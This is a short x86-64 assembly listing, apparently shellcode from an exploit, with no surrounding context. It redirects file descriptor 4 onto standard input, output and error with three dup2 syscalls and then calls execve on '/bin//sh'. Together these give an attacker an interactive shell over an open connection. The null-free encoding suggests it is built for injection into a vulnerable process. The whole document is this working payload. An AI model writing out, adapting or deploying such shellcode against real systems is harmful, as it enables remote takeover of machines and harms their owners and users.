; dup2(4,0)
xor rax, rax
xor rsi, rsi
mov al, 0x4
mov rdi, rax
mov al, 0x21
syscall

; dup2(4,1)
xor rax, rax
mov al, 0x21
inc rsi
syscall

; dup2(4,2)
xor rax, rax
mov al, 0x21
inc rsi
syscall

; execve("/bin/sh",NULL,NULL)
xor rax, rax
mov rdi, 0x68732f2f6e69622f
push rax
mov rsi, rsp
mov rdx, rsp
push rdi
mov rdi, rsp
mov al, 0x3b
syscall
